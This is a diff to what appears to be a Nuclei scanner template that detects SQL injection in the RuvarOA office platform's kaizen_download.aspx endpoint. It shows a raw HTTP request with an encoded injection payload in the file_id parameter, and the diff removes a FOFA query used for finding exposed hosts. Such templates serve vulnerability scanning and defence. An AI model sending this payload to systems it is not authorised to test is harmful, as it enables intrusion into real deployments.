@@ -3,12 +3,8 @@ info:
   name: RuvarOA协同办公平台-kaizen_download-SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fyiheesy5aoc5sh3'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fyiheesy5aoc5sh3
-    fofa: body="txt_admin_key"
 http:
 - raw:
   - 'GET /CorporateCulture/kaizen_download.aspx?file_id=1%27%29%20and%20%28select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%29%3E0-- HTTP/1.1
